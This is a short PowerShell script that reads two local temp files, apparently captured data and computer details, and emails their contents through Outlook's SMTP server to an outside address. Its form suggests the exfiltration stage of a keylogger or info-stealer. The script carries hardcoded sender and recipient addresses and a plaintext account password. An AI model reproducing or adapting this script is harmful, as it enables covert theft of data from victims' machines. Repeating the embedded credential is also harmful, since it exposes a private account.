$content = [IO.File]::ReadAllText(".\data.tmp")
$pcinfo = [IO.File]::ReadAllText(".\pcinfo.tmp")
$EmailFrom = “baikil@outlook.com”
$EmailTo = “rafi04@outlook.com”
$Subject = $pcinfo
$Body = $content
$SMTPServer = “smtp.live.com”
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPClient.EnableSsl = $true
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential(“baikil@outlook.com”, “Cdewq132”);
$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)